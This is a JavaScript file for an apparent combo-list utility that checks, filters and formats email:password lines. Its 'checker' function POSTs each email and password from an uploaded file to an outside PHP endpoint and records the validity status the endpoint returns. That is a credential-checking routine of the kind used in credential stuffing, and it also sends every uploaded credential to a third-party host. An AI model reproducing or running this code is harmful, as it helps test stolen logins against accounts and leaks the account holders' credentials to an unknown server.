function showTool(toolType) {
  const fileInput = document.getElementById("fileInput");
  if (!fileInput.files.length) {
    alert("Please upload a file first!");
    return;
  }

  const file = fileInput.files[0];
  const reader = new FileReader();

  reader.onload = async function () {
    const content = reader.result.trim();
    let result;

    if (toolType === "checker") {
      result = await checkAccounts(content.split("\n"));
    } else if (toolType === "remover") {
      const patterns = await fetchPatterns();
      result = removeURLs(content.split("\n"), patterns);
    } else if (toolType === "formatter") {
      result = formatAccounts(content.split("\n"));
    }

    displayToolContent(result.join("\n"));
  };

  reader.readAsText(file);
}

function goBack() {
  document.getElementById("mainMenu").style.display = "block";
  document.getElementById("toolUI").style.display = "none";
}

function displayToolContent(content) {
  document.getElementById("mainMenu").style.display = "none";
  document.getElementById("toolUI").style.display = "block";
  document.getElementById("toolContent").innerText = content;
}

async function checkAccounts(lines) {
  const results = [];
  for (const line of lines) {
    const [email, password] = line.split(":");
    const formData = new URLSearchParams();
    formData.append("uu", email.trim());
    formData.append("pp", password.trim());

    try {
      const response = await fetch("https://www.jarelldanegods.elementfx.com/hat.php", {
        method: "POST",
        body: formData,
      });
      const result = await response.json();
      results.push(`${line} => ${result.status || "Invalid"}`);
    } catch {
      results.push(`${line} => Error`);
    }
  }
  return results;
}

async function fetchPatterns() {
  const response = await fetch("patterns.json");
  return response.json();
}

function removeURLs(lines, patterns) {
  return lines.map(line =>
    patterns.some(pattern => line.includes(pattern)) ? "" : line
  );
}

function formatAccounts(lines) {
  return lines.map(line => {
    const [user, pass] = line.split(":");
    return `${user.trim()}:${pass.trim()}`;
  });
}
